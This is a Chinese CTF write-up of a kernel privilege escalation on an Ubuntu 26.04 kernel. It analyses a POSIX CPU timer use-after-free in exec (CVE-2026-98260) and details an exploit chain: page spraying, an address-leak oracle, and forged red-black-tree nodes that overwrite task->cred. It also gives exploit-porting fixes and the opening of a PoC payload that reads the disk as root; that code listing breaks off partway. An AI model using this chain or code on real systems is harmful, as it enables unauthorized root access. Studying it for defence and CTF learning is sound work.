# CanonicoPWN：Ubuntu 26.04内核提权（CVE-2026-98260）

## 1. 题目信息

| 项目 | 内容 |
| --- | --- |
| 分类 | PWN |
| 形态 | 容器题，无附件 |
| 附件 | 无 |
| 目标 | nc <host> <port>，guest内核提权 |

Flag：flag{动态容器已脱敏}

题目名**CanonicoPWN**暗示考点与Canonical/Ubuntu内核相关，实际环境正是一台Ubuntu 26.04 LTS（resolute）内核的QEMU虚拟机。服务直接给出串口控制台，登录用户为`ctf`（uid 1000，无任何capability）。

## 2. 题目分析

`/init`脚本关键内容：

```sh
#!/bin/busybox sh

/bin/busybox --install -s /bin
mount -t proc proc /proc
mount -t devtmpfs devtmpfs /dev 2>/dev/null
mount -t tmpfs -o mode=1777,nosuid,nodev tmpfs /tmp
hostname challenge
stty -echoctl rows 24 cols 80
echo 2 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
echo 4 > /proc/sys/kernel/perf_event_paranoid
echo 2 > /proc/sys/kernel/io_uring_disabled
echo 0 > /proc/sys/kernel/unprivileged_userns_clone
chmod 0400 /flag
chown 0:0 /flag
chown 1000:1000 /home/ctf
setsid cttyhack su - ctf
poweroff -f
```

- `/flag -> /dev/vda`（块设备，`br-------- root:root`，默认`0400`）；
- 内核命令行：`console=ttyS0 quiet oops=panic panic=-1`，`/proc/sys/kernel/panic_on_oops=1`；
- 无网络接口（仅`lo`），只能通过控制台交互；
- 目标明确：**在guest内核中拿到root，读取`/dev/vda`**。

加固配置封死了常见提权面：userns、unprivileged BPF、io_uring、perf全部关闭；没有setuid文件、没有可写系统目录。剩下的攻击面就是内核syscall本身。

### 侦察与附件

本题**没有附件**：题目描述“做CTF有附件，那和考试脑子里有答案有什么区别?”已经把话说死，镜像、驱动、符号表都得从线上环境里自己挖；服务形态是一台QEMU/KVM虚拟机，串口直通给选手。于是侦察分成两条平行的线：一条在guest内做只读枚举，另一条用同版本官方内核包还原出可比对的内核。

##### 内核版本与来源

```text
Linux version 7.0.0-39-generic (hatch@hatch)
(gcc (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0,
 GNU ld (GNU Binutils for Ubuntu) 2.42)
#1 SMP PREEMPT_DYNAMIC Thu Sep 24 08:42:15 UTC 2026
```

- `7.0.0-39-generic`是**Ubuntu 26.04 LTS（resolute）**的内核ABI；
- 构建者是`hatch@hatch`、`#1`（不是官方`#39-Ubuntu`），说明是作者用Ubuntu源码包（`Ubuntu-7.0.0-39.39` tag）在Ubuntu 24.04工具链下自行编译；
- `/proc/config.gz`可读（作者额外开了`CONFIG_IKCONFIG`）；与官方`-39.39`包内config对比，差异基本只是构建环境（gcc 13.3 vs 15.2、Rust关闭、MODULE_SIG_ALL off、若干`=m`改`=y`），内核源码看起来是原版Ubuntu源码。

##### 判定为公开CVE环境

无自定义`/dev`设备、`/proc/devices`全为标准项、kallsyms无新增syscall符号，结合：

- 内核版本精确为`7.0.0-39.39`（2026-09-24构建）；
- 当时最新的公开Ubuntu 26.04内核本地提权是**CVE-2026-98260**（public PoC完整、无需userns/BPF/io_uring）。

因此按该CVE展开。

##### 官方内核镜像分析

从Ubuntu源下载同版本官方包并提取：

- `linux-image-unsigned-7.0.0-39-generic_7.0.0-39.39_amd64.deb` → `bzImage`；
- `linux-modules-7.0.0-39-generic_7.0.0-39.39_amd64.deb` → `System.map-7.0.0-39-generic`、`config-7.0.0-39-generic`；
- 用`vmlinux-to-elf`从bzImage还原出带符号的vmlinux，并用自写BTF解析脚本核对结构体偏移。

`/proc/kallsyms`在`kptr_restrict=2`下地址为0，但**符号名顺序**可读；还完整导出了232029个符号名做对比。

##### 接口与攻击面枚举

guest内可用的侦察手段很少，但没有一项是白做的：

- `/proc/devices`、`/sys/class/*`全是内核标准项，没有题目自定义的字符设备或misc设备，说明不存在“审驱动”这条常规路线；
- 没有额外加载的模块，`/proc/config.gz`中关键子系统一律`=y`，既不能靠卸载模块改攻击面，也拿不到额外的可写参数；
- `kptr_restrict=2`让`/proc/kallsyms`、`/proc/modules`里的地址归零，但符号名与顺序仍可读，足以和官方`System.map`做集合比对；
- `dmesg_restrict=1`、`perf_event_paranoid=4`、`io_uring_disabled=2`、`unprivileged_userns_clone=0`，`/proc/self/status`的`CapEff`为0。

把这些线索合起来，攻击面只剩内核通用syscall：`timer_create(CLOCK_THREAD_CPUTIME_ID)`建POSIX CPU timer、`execve`触发`de_thread()`、`tgkill`探测TID交换、`mprotect`制造`mmap_lock`争用、`io_setup`提供可控的共享页。没有userns、没有eBPF、没有io_uring，意味着任何利用都必须在init userns里直接打内核对象。

##### 与官方镜像的一致性结论

符号名集合与官方`-39.39`的`System.map`只差构建相关的少量项，`begin_new_exec`、`posix_cpu_timer_del`、`collect_posix_cputimers`的指令序列也一致。BTF读出的偏移因此可以直接用于线上环境。

### 利用思路

整条链路完全建立在上面那个悬空节点上，不需要userns、BPF或io_uring，也不依赖任何内核代码地址。核心链路：

1. **制造UAF**
   - 非leader线程用`CLOCK_THREAD_CPUTIME_ID`创建一个远期POSIX CPU timer并`execve("/proc/self/exe")`；
   - 同一`mm`下用50000个单页VMA + 3个`CLONE_VM` helper反复`mprotect`争用`mmap_lock`；
   - killer轮询`tgkill(tgid, tid, 0)`，一旦返回`ESRCH`（说明`de_thread()`已完成TID交换）就`SIGKILL`；
   - `exec_mmap()`的`mmap_read_lock_killable`被打断，`exec()`在point of no return后失败，timer节点遗留在任务队列。

   这里的核心是**窗口**：必须在`de_thread()`完成TID交换之后、`exec_mmap()`拿到`mmap_lock`之前发出`SIGKILL`。`tgkill(tgid, tid, 0)`返回`ESRCH`正是“交换已完成”的用户态可观测信号；50000个单页VMA让每次`mprotect`都要遍历很长的VMA链，3个helper线程把`mmap_lock`占满，killer才有稳定的插入点。

2. **转移stale node +页回收**
   - 父进程`waitid(WNOWAIT)`观察僵尸但不回收；
   - 创建/删除定时器填充RCU sheaf：279个filler + 392个oracle worker候选timer；
   - 回收僵尸时`cleanup_timerqueue()`删除节点并置`ctmr->head = NULL`，节点残留在某个worker的timerqueue中；
   - 释放候选项/填充对象清空slab，PCP预热，再用64000匿名页+ 64000 AIO ring页回收该物理页。

3. **worker oracle与地址泄露**
   - worker消耗CPU时间触发`collect_posix_cputimers()`；
   - 内核在伪造页写入`ctmr->handling = current`（`object+0x128`）；
   - worker在伪造`it_lock`上自旋（用户可观测的“可控停顿点”）；
   - 用户扫描页内的内核指针，拿到worker的`task_struct`地址；
   - 释放锁后内核`list_del_init(&ctmr->elist)`把`elist.next/prev`写成direct map地址，得到`kernel_object = elist - 0x110`。

   oracle的任务是给悬空节点**找一个新的属主**：节点还挂在树上，但树已被`cleanup_timerqueue()`处理过，只有再被某个任务的`collect_posix_cputimers()`扫到，内核才会把它当合法timer去操作。`handling = current`暴露worker的`task_struct`，`list_del_init`写出的`next/prev`暴露direct map地址，两者相减就得到伪造页与内核线性映射之间的固定偏移。

4. **伪造RB删除覆盖cred**
   - 在页内构造A/C/M三个伪造节点：

```text
A.parent = C        A.right = NULL       A.left = S (task+0xd00)   A.head = H (task+0xca0)
C.parent = M        C.right = A          C.left = NULL
M.parent = NULL     M.right = NULL       M.left = C+8              M.head = H
```

   - 第二次`collect_timerqueue()`处理A时，`timerqueue_del(H, A)`的`rb_erase`执行`tmp->__rb_parent_color = pc`，其中`tmp = A.left = &task->cred`、`pc = C = fake_cred_addr`，于是**`task->cred = fake_cred`**；
   - 同一轮继续处理M，第二次删除把`C+8`写0，即把伪造cred的`uid/gid`清零；
   - 伪造cred的`euid/fsuid/egid/fsgid`为0、capability全1，`security`指向伪造AppArmor label，`user_ns`指向伪造user_namespace。

5. **提权落地**
   - worker使用伪造cred（fsuid 0）在暂存目录创建root所有的文件并`chmod 4755`；
   - 预先fork的launcher（保留合法cred）`execve`该setuid文件，euid变0；
   - payload`setresuid(0,0,0)`后以`O_RDONLY`打开`/dev/vda`。`/flag`就是指向该块设备的链接，权限`0400 root:root`，拿到euid 0后普通`read`即可；先用`ioctl(BLKGETSIZE64)`取容量（失败按8MiB处理）并把上限压到64MiB，再整段读入内存，打印前64字节hex并在可打印串里搜`flag`前缀，flag不在块首也能定位。

整条链最终只改了一个字段：`task->cred`。timer、页喷射、oracle全是为这一次写服务，写成功后进程仍走正常syscall路径，不会触发`panic_on_oops`。

### 移植适配

公开代码默认假设4级页表、`/tmp`可用、上传通道可靠，这三条在本环境全部不成立；下面按“致命程度”排列适配点。

##### 5级页表（LA57）——此前阶段3全部漏判的根因

guest CPU暴露`la57`，内核`CONFIG_X86_5LEVEL=y`且cmdline无`no5lvl`，因此direct map位于`ff11...`而非`ffff...`。PoC的判定：

```c
static int is_kernel_pointer(uint64_t value)
{
    return (value >> 48) == 0xffff && !(value & 7);
}
```

在5级页表下`ff11... >> 48 == 0xff11`，**所有真实内核指针都被拒绝**。修改为通用内核地址判定：

```c
static int is_kernel_pointer(uint64_t value)
{
    return (value >> 56) == 0xff && !(value & 7);  // 4/5 级页表通用
}
```

用户地址高位为0，不受影响；其余伪造指针均由`alias_delta = kernel_anchor - user_anchor`动态换算，天然适配。

诊断证据：修复前内核确实在处理回收的伪造页（CPU在`poc`线程上持续soft lockup，即卡在伪造的`it_lock`），但扫描端看不到任务指针。

##### 暂存目录与权限——stage2真正的最后一公里

- `/tmp`是`tmpfs ... nosuid`（setuid会失效）；
- `/var/tmp`、`/dev/shm`不存在；
- 唯一非nosuid可写位置是rootfs上的`/home/ctf`，但它初始为`755 ctf:ctf`。

最初把暂存目录改成`/home/ctf`后，即使cred覆盖成功，`openat(O_CREAT)`也会`EACCES`：`cap_capable()`的语义决定了伪造cred的能力**不能**作用于init userns拥有的资源（`cred->user_ns`的level为0时对init直接返回`-EPERM`）。

解决：运行前由ctf本人把自己拥有的目录改成世界可写：

```sh
chmod 777 /home/ctf
```

rootfs不是nosuid，setuid位仍然有效。这一修复后stage2立即成功。

##### 加速128k页喷射

PoC对每个AIO ring调用一次`mremap(..., MAP_FIXED, arena)`，64000次在目标机上耗时超过5分钟。直接使用`io_setup`返回的ring地址（内核`do_mmap`确认`MAP_SHARED`，内核direct map与用户映射共享同一物理页），跳过arena与mremap：

- 喷射时间从超过5分钟降到约25秒；
- 页内容、共享性与利用语义不变。

##### 静态musl构建

guest只有busybox，没有libc/编译器。用musl.cc交叉工具链静态编译（`-O2 -static -pthread`，strip后约71KB），通过控制台上传。

##### 串口控制台传输协议（本环境最大的工程障碍）

平台控制台的特点：

- 突发写入会丢字节（578KB一次性here-doc上传曾出现`gzip: invalid magic`）；
- tty初始`cols 80`，busybox ash行编辑器对超长单行有约1024字节的限制/折行异常，会把shell卡在PS2续行；
- `stty -echo`后shell提示符与命令输出会打印在同一行（`~ $ POC_00 <hash>`）。

最终协议：

1. 每个上传会话先执行`stty -echo cols 4000; chmod 777 /home/ctf; m=POC; echo ${m}_SETUP`；
2. 数据按**76字符短行**组织，每26行（约2KB）一个`cat > /home/ctf/pNN <<'__E9__' ... __E9__` here-doc块；
3. 每块之后执行`m=POC; echo ${m}_NN $(md5sum /home/ctf/pNN | cut -c1-32)`，与控制端预计算的块MD5比对，失败则恢复shell后重传该块；
4. 标记用变量拼接生成（输入中不含明文标记），匹配时允许出现在任意token位置（解决提示符合行）；
5. shell卡住时用“闭合引号+ Ctrl-C +换行”恢复；
6. 全部完成后`cat /home/ctf/p[0-9][0-9] > b64; base64 -d b64 | gzip -dc > poc; md5sum poc`。

修复后29个块约20秒完成上传。

##### 平台生命周期与自动化

- 每台VM被平台在约5～8分钟后SIGTERM终止（`panic_on_oops=1`下任何内核oops也会致命）；
- 平台对每个地址只允许单个实例，冷却期后重新分配（期间连接`ConnectionRefused`）；
- 因此实现了：
  - 攻击循环：上传+运行失败后自动等下一台VM重试。

##### 诊断插桩

为确认stage2的内核行为，在`run_stage1()`的stage2等待循环里轮询伪造页字段：

```text
POC:DIAG_EXP object=... fake=...
  expect p=fake_cred l=task+0xd00 hd=task+0xca0
POC:DIAG:0      h=0 p=fake_cred ... c8=node
POC:DIAG:213    h=0 p=... l=task+0xd00 hd=0 c8=0
```

`c8`从A节点地址变为0、`hd`变为0，直接证明两次伪造RB删除都执行了；此后`s1_done/s1_ok`。

## 3. 解题过程

### 根因

这节要回答三件事：漏洞落在哪个对象的生命周期上、加固配置为什么挡不住、以及它凭什么能一路写到`cred`。

`exec()`由**非线程组长（non-leader thread）**调用时，`de_thread()`会交换调用线程与旧leader的PID关联并`release_task(旧leader)`。但POSIX CPU timer的清理在`begin_new_exec()`中排在多处**可能失败**的操作之后：

```c
int begin_new_exec(struct linux_binprm *bprm)
{
    ...
    bprm->point_of_no_return = true;

    retval = de_thread(me);              // [1] TID 已交换
    ...
    retval = unshare_files();
    ...
    retval = set_mm_exe_file(...);
    ...
    retval = exec_mmap(bprm->mm);        // 可被 SIGKILL 打断 → 失败
    ...
    retval = exec_task_namespaces();
    ...
#ifdef CONFIG_POSIX_TIMERS
    spin_lock_irq(&me->sighand->siglock);
    posix_cpu_timers_exit(me);           // [2] 正常路径的清理
    spin_unlock_irq(&me->sighand->siglock);
    exit_itimers(me);
    flush_itimer_signals();
#endif
    ...
}
```

一旦`exec_mmap()`等失败（任务已过`point_of_no_return`只能终止），`[2]`不会执行。退出路径`exit_itimers()`删除timer时：

```c
static int posix_cpu_timer_del(struct k_itimer *timer)
{
    ...
    p = timer_lock_sighand(timer, &flags);   // 内部 pid_task()
    if (!p) {
        // 任务关联已消失 → 直接跳过 timerqueue_del
        goto out;
    }
    ...
out:
    put_pid(ctmr->pid);
    timer->it_status = POSIX_TIMER_DISARMED;
    return ret;
}
```

`posixtimer_free_timer()`用`kfree_rcu()`释放`k_itimer`，但`struct cpu_timer.node`仍留在存活（exec后）任务的timerqueue中。父进程回收僵尸时，`__exit_signal()`→`cleanup_timerqueue()`再次删除这个已释放的节点，形成UAF/内存破坏。

修复补丁`acb03d388181`（`exec: Cleanup POSIX timers right after de_thread()`）把清理整体移到`de_thread()`成功之后。

### 对象布局与引用计数缺口

换成对象语言更清楚。`struct k_itimer`（`0x180`字节）内嵌`struct cpu_timer`（偏移`0xe0`），后者又含`timerqueue_node node`（`+0x00`）、`timerqueue_head *head`（`+0x20`）、`list_head elist`（`+0x30`）和`task_struct *handling`（`+0x48`）。timer arm之后，它的`node`挂进**当前任务**的`posix_cputimers`红黑树（CPUCLOCK_SCHED用`0xca0`处的`tqhead`），而队列本身不持有任何引用计数——它默认“节点在树上，对应`k_itimer`就一定活着”。

这个不变量平时由`posix_cpu_timer_del()`维护：先把节点摘下，再`put_pid()`、置`DISARMED`，最后由`posixtimer_free_timer()`走`kfree_rcu()`回收。漏洞路径把顺序打断了——`pid_task()`查不到任务就直接`goto out`，**跳过`timerqueue_del()`**，可`put_pid()`与随后的`kfree_rcu()`照常执行。于是树上留下一个指向已释放`k_itimer`的悬空节点，引用计数再也覆盖不到这个“队列持有者”。

更糟的是节点没有随进程消失：`de_thread()`之后新旧leader的PID关联已经交换，`exec()`失败退出的是“换了身份”的线程，而`cleanup_timerqueue()`是在父进程`__exit_signal()`里跑的，它会对同一节点再做一次`list_del`/`timerqueue_del`。一次释放、两次摘除，第二次就是对已回收slab的写——只要这块物理页被攻击者控制，`rb_erase()`里的指针操作就变成了任意写。

### 版本确认

- Ubuntu官方changelog显示，修复补丁首次出现在**`7.0.0-41.41`**（`exec: Cleanup POSIX timers right after de_thread()` + `posix-cpu-timers: Prevent freeing a timer which is queued on the expiry list`）；
- 目标是**`7.0.0-39.39`**，没有该修复。

对官方`-39` vmlinux反汇编进一步确认：

```text
begin_new_exec:
    call de_thread
    call __io_uring_cancel
    call unshare_files
    call set_mm_exe_file
    ...
    call exec_mmap
    call exec_task_namespaces
    ...
    call posix_cpu_timers_exit   ← 仍在后面
    call exit_itimers
    call flush_itimer_signals
```

`posix_cpu_timer_del()`也确认走`timer_lock_sighand()`（这是CVE-2026-64560的修复，`920f893f735e`，`-38.38`已合入），查找失败时跳到`put_pid + it_status=DISARMED`，**跳过timerqueue_del**，UAF依然成立。

### BTF偏移核对

对官方`-39` vmlinux的`.BTF`解析，结果与公开PoC的硬编码偏移完全一致：

| 结构/字段 | 偏移 |
| --- | --- |
| `sizeof(struct k_itimer)` | `0x180` |
| `k_itimer.it.cpu` | `0xe0` |
| `cpu_timer.node` | `+0x00`（即对象`0xe0`） |
| `cpu_timer.head` | `+0x20`（`0x100`） |
| `cpu_timer.elist` | `+0x30`（`0x110`） |
| `cpu_timer.handling` | `+0x48`（`0x128`） |
| `task_struct.posix_cputimers` | `0xc68` |
| CPUCLOCK_SCHED tqhead | `0xca0` |
| `task_struct.cred` | `0xd00` |

### 写原语与提权落点

`rb_erase()`删除节点时会执行`tmp->__rb_parent_color = pc`这类重挂操作：若删除`A`时它的`left`被伪造成`&task->cred`、`parent`被伪造成`fake_cred`，内核就把`fake_cred`写进`task->cred`。所以这个UAF提供的不是控制流劫持，而是**把一个受控内核地址写进任意字段**的能力，天然适合改cred。

原生cred还带`usage`引用计数、`security`和`user_ns`层级校验，伪造时三样都要补齐：`security`指向假AppArmor label，`user_namespace`的`level`等字段置1以通过层级遍历。这一步决定了最终能否真的在rootfs上建出root文件，而不只是让`geteuid()`返回0。

## 4. PoC

```c
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/sendfile.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include <sys/time.h>

#define VMA_COUNT 50000UL
#define HELPER_STACK (1UL << 20)

/* --- root_payload --- */
static void root_payload(void)
{
	char *const shenv[] = { (char *)"PATH=/bin:/usr/bin",
				(char *)"HOME=/root", (char *)"TERM=linux", NULL };
	char *const shargv[] = { (char *)"sh", (char *)"-i", NULL };
	unsigned long long size = 0;
	unsigned char *buf;
	ssize_t got = 0;
	int fd;

	dprintf(1, "\n=== ROOT euid=%d ===\n", geteuid());
	fd = open("/dev/vda", O_RDONLY | O_CLOEXEC);
	if (fd >= 0) {
		if (syscall(SYS_ioctl, fd, 0x80081272UL, &size) || !size)
			size = 8ULL << 20;
		if (size > (64ULL << 20))
			size = 64ULL << 20;
		buf = mmap(NULL, (size_t)size, PROT_READ | PROT_WRITE,
			   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		if (buf != MAP_FAILED) {
			while (got < (ssize_t)size) {
				ssize_t n = read(fd, buf + got,
						 (size_t)size - (size_t)got);

				if (n <= 0)
					break;
				got += n;
			}
			dprintf(1, "VDASIZE=%llu READ=%zd\n", size, got);
```
